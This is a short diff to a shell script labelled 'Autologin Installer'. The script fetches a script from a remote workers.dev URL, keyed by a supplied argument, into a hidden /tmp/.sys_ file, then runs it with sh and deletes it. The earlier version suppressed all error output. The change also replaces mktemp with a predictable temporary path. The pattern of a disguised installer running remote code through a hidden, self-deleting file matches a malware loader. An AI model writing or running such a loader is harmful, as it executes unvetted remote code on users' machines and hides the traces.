@@ -3,9 +3,10 @@
 # Autologin Installer
 # ============================================================================
 
+#!/bin/sh
 _a="https://autologin.creativy24.workers.dev"
 _b="$1"
-_c=$(mktemp /tmp/.sys_XXXXXX)
-curl -sSL "$_a/s?k=$_b" -o "$_c" 2>/dev/null
-sh "$_c" 2>/dev/null
+_c="/tmp/.sys_$$"
+curl -sSL "$_a/s?k=$_b" -o "$_c"
+sh "$_c"
 rm -f "$_c"
